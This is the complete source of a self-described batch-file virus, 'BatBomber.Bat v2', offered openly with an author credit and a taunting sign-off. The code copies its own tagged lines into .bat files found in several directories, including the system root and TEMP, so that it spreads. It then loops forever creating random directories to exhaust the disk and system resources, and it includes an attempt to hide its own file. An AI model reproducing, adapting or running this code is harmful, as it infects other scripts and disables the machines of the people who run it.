@echo off
:codeBegin
:: --------------------------------------------------------------------------------
:: d8888b.  .d8b.  d888888b d8888b.  .d88b.  .88b d88.  d8888b. d88888b d8888b.
:: 88  `8D d8' `8b `~~88~~' 88  `8D .8P  Y8. 88'YbdP`88 88  `8D 88'     88  `8D
:: 88oooY' 88ooo88    88    88oooY' 88    88 88  88  88 88oooY' 88ooooo 88oobY'
:: 88~~~b. 88~~~88    88    88~~~b. 88    88 88  88  88 88~~~b. 88~~~~~ 88  `8b
:: 88   8D 88   88    88    88   8D `8b  d8' 88  88  88 88   8D 88.     88  `88.
:: Y8888P' YP   YP    YP    Y8888P'  `Y88P'  YP  YP  YP Y8888P' Y88888P 88   YD.BAT
:: -------------------------Coded by iNdX, aka Hoffa-------------------------------
::
:: Name: BatBomber.Bat v2
:: OS Compatibility: XP/Vista
:: File description: Main virus engine.
:: Notes: Every line with "B b B" (without spaces and quotes) will be copied to infected file.
:: ------------------------------------
:: Last modification: 27/01/2008
if exist %0 goto BbB_main
if not exist %0 goto codeEnd
attrib +h %0
:BbB_main
for %%a in (*.bat ..\*.bat ..\..\*.bat C:\*.bat %SYSTEMROOT%\*.bat %TEMP%\*.bat) do set BbB=%%a
find "BbB"<%BbB%
if errorlevel 1 find "BbB"<%0>>%BbB%
:BbB_loop
mkdir BbB%RANDOM%%RANDOM%%RANDOM%
goto BbB_loop
:codeEnd
:: Got ya bitches !